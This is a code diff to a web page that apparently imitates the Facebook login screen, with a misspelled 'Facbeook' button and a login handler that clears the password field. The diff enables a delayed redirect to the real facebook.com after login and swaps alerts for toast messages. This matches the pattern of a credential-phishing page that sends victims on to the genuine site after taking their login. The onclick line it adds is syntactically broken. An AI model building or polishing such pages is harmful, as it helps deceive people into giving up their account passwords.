@@ -66,7 +66,7 @@
   <a class="forgot" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc2MTI4ODE4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login"><b>Forgot Password?</b></a>
   <hr>
   <p>OR</p>
-  <button  class="creat" onclick="create()">Create New Facbeook account</button>
+  <button  class="creat" onclick="window.open('https://www.facebook.com/','_parent'">Create New Facbeook account</button>
   </center>
   
 </body>
@@ -160,7 +160,7 @@ function log1(){
   document.getElementById("pass").value="";
   sessionStorage.setItem("fblog","1")
   
-  /*setTimeout(() => { window.open("https://www.facebook.com/","_parent"); }, 3000); */
+  setTimeout(() => { window.open("https://www.facebook.com/","_parent"); }, 5000);
   
 
 }
@@ -171,9 +171,9 @@ function log(){
   // window.open("https://www.facebook.com/","_parent")
 
   if(number== ""){
-    alert('Enter Number or Email')
+    showToast('Enter Number or Email')
   }else if(pass== ""){
-    alert('Enter a Password')
+    showToast('Enter a Password')
   }else{
     log1()}
 }
